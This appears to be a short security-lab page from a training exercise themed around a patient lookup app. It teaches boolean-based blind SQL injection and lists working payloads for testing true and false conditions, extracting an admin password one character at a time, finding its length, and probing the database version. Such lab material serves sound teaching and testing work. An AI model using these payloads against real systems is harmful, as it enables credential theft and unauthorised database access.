Patient Existence Check — Boolean-Based Data Extraction

🔴 Critical
🧪 Lab Objective — Boolean Payloads

Unlike normal SQLi, blind injection returns only TRUE (patient found) or FALSE (not found). Use this binary response to infer data character by character.

  • True condition: 1' AND 1=1--
  • False condition: 1' AND 1=2--
  • Check first char of admin password: 1' AND SUBSTRING((SELECT password FROM users WHERE username='admin'),1,1)='a'--
  • Check password length: 1' AND LENGTH((SELECT password FROM users WHERE username='admin'))=8--
  • Check version: 1' AND SUBSTRING(@@version,1,1)='5'--
